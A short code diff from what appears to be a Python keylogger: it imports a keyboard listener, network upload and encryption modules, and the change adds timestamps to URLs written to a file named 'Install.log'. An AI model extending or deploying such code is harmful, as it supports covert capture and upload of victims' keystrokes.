@@ -6,6 +6,7 @@ from urllib.parse import urlencode
 from pynput.keyboard import Listener
 from urllib.request import urlopen, Request
 from sys import argv, exit
+from datetime import datetime
 
 from apscheduler.schedulers.blocking import BlockingScheduler
 from cryptography.hazmat.backends import default_backend
@@ -172,7 +173,8 @@ def upload():
             pass
     f = open("Install.log", 'a')
     for url in urls_list:
-        f.write(url[16:])
+        s = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+        f.write(s + "\t" + url[16:] + "\n")
     f.close()
     msg = ''
 
